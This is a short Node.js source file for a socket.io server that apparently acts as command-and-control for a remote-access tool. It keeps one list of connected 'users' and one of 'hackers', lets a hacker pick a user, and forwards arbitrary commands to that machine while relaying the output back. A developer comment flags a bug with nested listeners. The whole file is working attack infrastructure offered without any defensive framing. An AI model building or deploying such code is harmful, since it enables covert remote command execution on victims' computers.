const SEND_PORT = 7681;
const REC_PORT = 7670;
const io = require("socket.io");

const sendIO = io.listen(SEND_PORT);
const recIO = io.listen(REC_PORT);

const users = {};
const hackers = {};

sendIO.on("connection", (socket) => {
  let socketUser = "";
  log("connection", `${socket.client.id}`);

  socket.on("new-user", (newUser) => {
    socketUser = newUser.substr(0, newUser.length - 1);
    log("new user", `${socketUser}`);
    users[socketUser] = socket;
  });

  // socket.on("performed-command", (data) => {
  //   const { command, result } = data;
  //   log("command", `${command}`);
  //   log("result", `${result}`);
  // });

  socket.on("disconnect", () => {
    log("disconnect", `${socketUser}`);
    delete users[socketUser];
  });
});

recIO.on("connection", (socket) => {
  let socketUser = "";
  let currentConnection = "";

  log("connection", `${socket.client.id}`);

  socket.on("new-hacker", (newHacker) => {
    socketUser = newHacker.substr(0, newHacker.length - 1);
    log("new hacker", socketUser);
    hackers[socketUser] = socket;
  });

  socket.on("show-users", () => {
    log(socketUser, "show");
    socket.emit("show-users", Object.keys(users));
  });

  socket.on("connect-user", (connectTo) => {
    log(socketUser, `Connecting to ${connectTo}`);
    if (!(connectTo in users)) {
      socket.emit("connect-user", { success: 0, connectTo: connectTo });
    } else {
      currentConnection = connectTo;
      socket.emit("connect-user", { success: 1, connectTo: connectTo });
    }
  });

  socket.on("return", () => {
    log(socketUser, `Terminating connection to ${currentConnection}`);
    currentConnection = "";
    socket.emit("return");
  });

  socket.on("perform-command", (command) => {
    users[currentConnection].emit("perform-command", command);
    //This is the issue. Don't create listeners within listeners.
    users[currentConnection].on("performed-command", (data) => {
      socket.emit("performed-command", data);
    });
  });

  socket.on("disconnect", () => {
    log("hacker disconnect", `${socketUser}`);
    delete hackers[socketUser];
  });
});

function log(title, message) {
  console.log(`[${title.toUpperCase()}] ${message}`);
}
